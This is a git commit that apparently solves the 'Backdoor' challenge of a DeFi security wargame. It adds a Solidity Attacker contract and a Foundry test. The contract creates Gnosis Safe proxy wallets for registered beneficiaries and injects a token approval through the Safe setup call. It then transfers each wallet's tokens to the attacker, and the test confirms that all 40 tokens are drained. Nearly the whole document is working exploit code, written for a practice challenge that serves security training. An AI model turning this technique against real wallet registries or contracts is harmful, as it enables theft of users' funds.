b5069ac8c7adcff182a2227726d651219e599654
theakalord <theakalord@gmail.com>
2023-01-11 06:35:09 -0600

    complete backdoor challenge

---
+++ src/backdoor/Attacker.sol
@@ -0,0 +1,51 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+
+contract Attacker {
+    address private owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function approve(address token, address spender) external {
+        IERC20(token).approve(spender, 10 ether);
+    }
+
+    function attack(
+        GnosisSafeProxyFactory factory,
+        address singleton,
+        address[] memory users,
+        address callback,
+        address token
+    ) external {
+        require(msg.sender == owner, "Only owner can call this function");
+
+        for (uint256 i; i != 4; ++i) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            GnosisSafeProxy proxy = factory.createProxyWithCallback(
+                singleton,
+                abi.encodeWithSelector(
+                    GnosisSafe.setup.selector,
+                    owners,
+                    1,
+                    address(this),
+                    abi.encodeWithSignature("approve(address,address)", token, address(this)),
+                    address(0),
+                    address(0),
+                    0,
+                    address(0)
+                ),
+                i,
+                IProxyCreationCallback(callback)
+            );
+            IERC20(token).transferFrom(address(proxy), msg.sender, 10 ether);
+        }
+    }
+}
---
+++ test/backdoor/backdoor.t.sol
@@ -0,0 +1,80 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "../../src/DamnValuableToken.sol";
+import "../../src/backdoor/WalletRegistry.sol";
+import "../../src/backdoor/Attacker.sol";
+
+contract BackdoorTest is Test {
+    DamnValuableToken public token;
+    GnosisSafe public masterCopy;
+    GnosisSafeProxyFactory public walletFactory;
+    WalletRegistry public walletRegistry;
+
+    address public deployer = address(1);
+    address public attacker = address(2);
+    address public alice = address(3);
+    address public bob = address(4);
+    address public charlie = address(5);
+    address public david = address(6);
+    address[] public users = [alice, bob, charlie, david];
+
+    uint256 public constant AMOUNT_TOKENS_DISTRIBUTED = 40 ether;
+
+    function setUp() public {
+        startHoax(deployer);
+
+        // Deploy Gnosis Safe master copy and factory contracts
+        masterCopy = new GnosisSafe();
+        walletFactory = new GnosisSafeProxyFactory();
+        token = new DamnValuableToken();
+
+        // Deploy the registry
+        walletRegistry = new WalletRegistry(
+            address(masterCopy),
+            address(walletFactory),
+            address(token),
+            users
+        );
+
+        // Users are registered as beneficiaries
+        for (uint256 i; i < users.length; ++i) {
+            assertTrue(walletRegistry.beneficiaries(users[i]));
+        }
+
+        // Transfer tokens to be distributed to the registry
+        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
+
+        vm.stopPrank();
+    }
+
+    function testExploit() public {
+        /** YOUR EXPLOIT GOES HERE */
+        startHoax(attacker);
+        Attacker attackerContract = new Attacker();
+        attackerContract.attack(
+            walletFactory,
+            address(masterCopy),
+            users,
+            address(walletRegistry),
+            address(token)
+        );
+        vm.stopPrank();
+
+        /** SUCCESS CONDITION */
+        for (uint256 i; i < users.length; ++i) {
+            address wallet = walletRegistry.wallets(users[i]);
+
+            // User must have registered a wallet
+            assertFalse(wallet == address(0), "User did not register a wallet");
+
+            // User is no longer registered as a beneficiary
+            assertFalse(walletRegistry.beneficiaries(users[i]));
+        }
+
+        // Attacker must have taken all tokens
+        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
